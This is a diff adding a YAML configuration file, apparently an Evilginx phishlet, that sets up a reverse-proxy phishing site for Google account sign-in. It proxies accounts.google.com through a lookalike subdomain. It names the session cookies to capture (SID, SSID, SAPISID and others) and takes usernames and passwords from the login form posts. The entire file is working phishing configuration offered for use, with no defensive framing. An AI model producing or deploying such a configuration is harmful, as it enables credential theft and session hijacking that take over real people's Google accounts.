@@ -1,0 +1,30 @@
+author: '@Jerp'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'elo', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: 'accounts.google.com'
+    keys: ['__Host-GAPS','SID','__Secure-3PSID', 'LSID', '__Host-3PLSID', 'SSID', 'APISID', 'SAPISID', '__Secure-3PAPISID', 'ACCOUNT_CHOOSER', '__Host-GAPS', 'NID']
+
+auth_urls:
+  - '/signin'
+  - '/signin/.*'  
+ 
+
+credentials:
+  username:
+    key: 'identifierInput'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin'
